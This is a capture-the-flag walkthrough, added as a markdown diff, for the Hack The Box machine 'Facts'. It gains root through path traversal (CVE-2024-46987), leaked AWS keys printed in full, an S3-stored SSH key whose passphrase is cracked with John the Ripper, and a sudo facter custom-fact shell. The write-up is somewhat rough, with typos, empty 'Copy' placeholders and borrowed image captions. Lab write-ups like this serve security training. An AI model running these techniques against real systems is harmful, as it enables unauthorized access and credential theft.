@@ -1,0 +1,164 @@
+# FACTS
+
+we start with enumeration 
+
+will do 
+
+first put facts.htb in  the /etc/hosts
+
+`feroxbuster -u ‘http://facts.htb/’` 
+
+after scrolling around we can se the update password
+
+we update password and we intercept the message we see that `&password%5Bpassword%5D=egw&password%5Bpassword_confirmation%5D=egw` is on the message so maybe if we add `&password[role]=admin` in this message!
+
+then i found this cve from look at the version of camelen 2.9.0
+
+**CVE-2024-46987**
+
+ witch has an **arbitrary path traversal**
+
+`http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd`
+
+we can see that we have 3 users that are not the standard ones 
+
+**william** 
+
+**trivia** 
+
+**_lauren**
+
+we will try
+
+`http://facts.htb/admin/media/download_private_file?file=/home/william/user.txt`
+
+and it worked we have the flag
+
+. now lets try to find athoer information! 
+
+we found an aws access key and an aws secret access ley 
+
+# **AWS S3 Enumeration**
+
+After discovering AWS credentials within the CMS filesystem configuration, I attempted to validate whether the keys granted access to the associated cloud storage environment. To do this, I configured the AWS CLI locally using the recovered credentials:
+
+`aws configure
+AWS Access Key ID [None]: AKIA55A02DA8320B27B5
+AWS Secret Access Key [None]: mg1ErEFKwETZFqAUrB0pTAMI8CVwUfIkjSfNiK4I`
+
+`Default region name [None]: us-east-1`
+
+`Default output format [None]: json`
+
+I supplied the exposed access key, secret key, and region obtained from the admin panel. Once configured, I attempted to enumerate available S3 buckets using the custom endpoint specified in the CMS configuration.
+
+`aws s3 ls --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+
+The command successfully returned two accessible buckets named **internal** and **randomfacts**, confirming that the credentials were valid and provided access to the storage service. The presence of an **internal** bucket was particularly interesting, as bucket names containing internal references often store sensitive application or system-related data.
+
+![HTB Facts Writeup. BOX SUMMARY | by Ibrahim Isiaq Bolaji](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNg3XHTAjO5r5ZJjy1lYysDB568Urw1FHD_U8ydmGg8LhnGUOZ1epT77lq1EB7ov0ZRra22rvgBfNQVwTUvq8xm_0GtcUHUgGHOWP0tGS9M-aJ-g9EEXmgx0aC_QIT-ZRhYdS7ZO3SVqpEWy8OVT3vMx9pAgGqr0-VXuxuLYVQNGM_3RygK8o5OXlnhMQ/s16000/bandicam%202026-02-06%2004-27-18-624.jpg)
+
+To further investigate, I enumerated the contents of the internal bucket:
+
+Copy
+
+The listing revealed several directories and files commonly associated with a user home directory, including `.ssh`, `.bundle`, `.cache`, `.bashrc`, `.profile`, and other shell-related configuration files. The presence of an `.ssh` directory immediately stood out, as it often contains authentication keys that can potentially be used for SSH access.
+
+The discovery of user environment files inside the storage bucket suggested that sensitive system data was being stored within the S3 environment. Since SSH configuration directories frequently contain private keys or authorized key files, this bucket represented a high-value target for further enumeration.
+
+`aws s3 ls s3://internal/ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+
+wee see the .ssh/ file 
+
+to see whats insids look at 
+
+`aws s3 ls s3://internal/.ssh/ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+
+to donwload the files do it like this 
+
+`aws s3 cp s3://internal/.ssh/id_ed25519 ./ --endpoint-url [http://facts.htb:54321](http://facts.htb:54321/)`
+
+The command successfully downloaded the private key to my local machine. Inspecting the file contents confirmed that it was an **OpenSSH private key**, which could potentially be used to authenticate to the target system.
+
+Before attempting to use the key, I adjusted its permissions to meet SSH security requirements:
+
+Copy
+
+Ensuring proper file permissions is necessary because SSH clients refuse to use keys that are accessible by other users on the system.
+
+![HTB-writeups. Writeups of HackTheBox retired machines](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVa121q7FAhLFYS9-ugb_lQ24XNkwl1tpIqDlC9HLY0fZlrgvZsTUD0NWm9D4rnDMklc0FBPNc1ZCekJnYEqPcCUjX4Z8yrkz3FCSXG-3C7MwVlx0qFJuHlQHeXnairs_QdzV_ynHpAm-V1K_CTF90QQiyQ2dWljGkhWPTIBrb9xnxSofRXDQOF3Uq4DA/s16000/bandicam%202026-02-06%2004-29-53-397.jpg)
+
+# **SSH Key Cracking**
+
+After preparing the key, I attempted to use it for authentication but suspected that it might be protected with a passphrase. To verify this, I converted the SSH key into a crackable hash format using `ssh2john`:
+
+`ssh2john id_ed25519 >> ssh.hash`
+
+With the hash generated, I used **John the Ripper** alongside the commonly used `rockyou.txt` wordlist to attempt passphrase cracking:
+
+`john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`
+
+![fact htb writeup walkthrough complete solution pdf easy linux machine](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQMZMsIIvSsl6HuyOqeVbysrv2mnLN4HzAu-sEyfBwkEQ9yHWgc_jVUFyX6PnaHvot4Jlu3PkIUZM0RpcGhc52EJR61e23G1m8suGhX42NXwnw9h81NRCowou6RVls8o2_u0J_PXeXpDgR5WjCqZGQ2EzqFR7awbiwXlayb47WL24elUEf5tIVIUh0/s16000/bandicam%202026-02-08%2014-37-21-282.jpg)
+
+The cracking process completed successfully and revealed the passphrase associated with the SSH private key. The recovered passphrase was:
+
+`dragonballz`
+
+Successfully recovering the passphrase confirmed that the SSH private key could now be used for authentication attempts. With both the private key and its passphrase available, I prepared to test SSH access to the target system using the discovered credentials.
+
+use to prepare the key
+
+`chmod 600 id_ed25519`
+
+and then ssh -i <key> name@facts,htb
+
+now we are inside as trivia
+
+i want to pass linpeas to see if there is any way to for user escalation
+
+`scp -i ../Macinia/facts/id_ed25519 /usr/share/peass/linpeas/linpeas.sh trivia@facts.htb:/home/trivia`
+
+now that trivia is on host lets make is executabel 
+
+`chmod +x linpeas.sh` 
+
+and now we run `linpeas.sh`
+
+**Step 8: Privilege Escalation to Root**
+
+My first step was always to check sudo privileges.
+
+```
+trivia@facts:~$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass,
+    secure_path=..., use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+facter is a command-line tool that gathers and displays system information. Crucially, it allows users to create and load their own "custom facts" written in Ruby.
+
+The standard way to load custom facts is to set the FACTERLIB environment variable to a directory containing .rb files. I tried the obvious method:
+
+```
+trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
+trivia@facts:~$ sudo FACTERLIB=/tmp /usr/bin/facter pwn
+sudo: sorry, you are not allowed to set the following environment variables: FACTERLIB
+```
+
+The sudoers configuration explicitly blocked setting the FACTERLIB variable. This was a dead end, but not for long.
+
+I checked the facter man page or help section (mentally, or by running facter --help locally in my mind). It revealed an alternative flag: --custom-dir. This flag does the exact same thing as the FACTERLIB variable but as a command-line argument, which is not blocked by the sudoers restriction.
+
+This was the bypass.
+
+I created the same simple Ruby script to spawn a shell.
+
+```
+trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
+trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp
+```
+
+And just like that, I was root.
